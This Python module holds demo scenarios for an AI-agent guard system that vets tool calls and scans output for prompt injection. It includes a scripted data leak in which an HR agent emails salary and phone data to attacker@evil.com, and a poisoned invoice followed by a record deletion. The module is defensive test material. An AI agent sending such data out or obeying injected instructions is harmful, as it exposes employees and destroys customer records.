"""Scripted demo scenarios for AgentGuard.

Each scenario exercises a specific guard behaviour so the dashboard can
show all five decision types in one click.  All calls go through
``guard.engine.evaluate`` – the same path used by real agents.
"""
from __future__ import annotations

from ..guard.engine import Request, evaluate, update_agent
from ..tools.mock_tools import execute
from ..guard.injection import scan_output
from ..guard import engine
from ..guard.ratelimit import reset as reset_rate_limit


def _call(agent: str, session: str, task: str, tool: str, args: dict) -> dict:
    """Send one intercepted tool call through the guard pipeline."""
    d = evaluate(
        Request(
            agent_id=agent,
            session_id=session,
            task=task,
            tool=tool,
            arguments=args,
        )
    )
    output = None
    if d.decision == "ALLOW":
        raw = execute(tool, args)
        safe, scan = scan_output(raw)
        output = safe
        if scan.injection_detected:
            engine.session_risk[session] = 70
    elif d.decision == "ESCALATE":
        from ..approvals import create as create_approval
        create_approval(
            d.event_id,
            agent,
            session,
            tool,
            args,
        )
    return {
        "tool": tool,
        "decision": d.decision,
        "score": d.score,
        "reasons": d.reasons,
        "event_id": d.event_id,
        "shadow": d.shadow,
        "result": output,
    }


def _run_normal_task(sid: str) -> list[dict]:
    """Normal finance task – all steps should ALLOW."""
    return [
        _call(
            "finance-agent", sid,
            "Summarise sales data and invoices",
            "query_database", {"table": "sales"},
        ),
        _call(
            "finance-agent", sid,
            "Summarise sales data and invoices",
            "read_document", {"doc_id": "inv-1"},
        ),
    ]


def _run_data_leak(sid: str) -> list[dict]:
    """HR agent tries to email salary data externally – final call BLOCK."""
    return [
        _call(
            "hr-agent", sid,
            "Summarise the employee list",
            "query_database", {"table": "employees"},
        ),
        _call(
            "hr-agent", sid,
            "Summarise the employee list",
            "send_email", {
                "to": "attacker@evil.com",
                "subject": "Employee salary data",
                "body": "Name: Asha, salary: 85000, phone: 9000000000",
            },
        ),
    ]


def _run_prompt_injection(sid: str) -> list[dict]:
    """Agent reads poisoned doc; subsequent delete BLOCK/ESCALATE."""
    return [
        _call(
            "finance-agent", sid,
            "Read the invoice",
            "read_document", {"doc_id": "inv-poison"},
        ),
        _call(
            "finance-agent", sid,
            "Read the invoice",
            "delete_record", {"table": "customers", "record_id": "c1"},
        ),
    ]


def _run_suspicious_payment(sid: str) -> list[dict]:
    """10× normal payment amount – should ESCALATE."""
    return [
        _call(
            "finance-agent", sid,
            "Pay approved invoice",
            "make_payment", {"vendor": "Acme", "amount": 100_000, "currency": "INR"},
        ),
    ]


def _run_runaway_loop(sid: str) -> list[dict]:
    """50 rapid calls trigger rate-limit → BLOCK and agent auto-pause."""
    results = []
    for _ in range(50):
        results.append(
            _call(
                "finance-agent", sid,
                "Read invoices",
                "read_document", {"doc_id": "inv-1"},
            )
        )
    return results


_SCENARIOS = {
    "normal_task": _run_normal_task,
    "data_leak": _run_data_leak,
    "prompt_injection": _run_prompt_injection,
    "suspicious_payment": _run_suspicious_payment,
    "runaway_loop": _run_runaway_loop,
}


def run(name: str) -> dict:
    """Run a named scenario and return its list of call results.

    Resets rate-limit state and agent status so each run is independent.
    """
    if name not in _SCENARIOS:
        raise ValueError(f"Unknown scenario: {name!r}")

    sid = f"demo-{name}"
    reset_rate_limit()

    # Clear any leftover session risk from this session ID
    engine.session_risk.pop(sid, None)

    # Determine primary agent and reset it to active
    primary = "hr-agent" if name == "data_leak" else "finance-agent"
    update_agent(primary, status="active")

    actions = _SCENARIOS[name](sid)
    return {"scenario": name, "actions": actions}
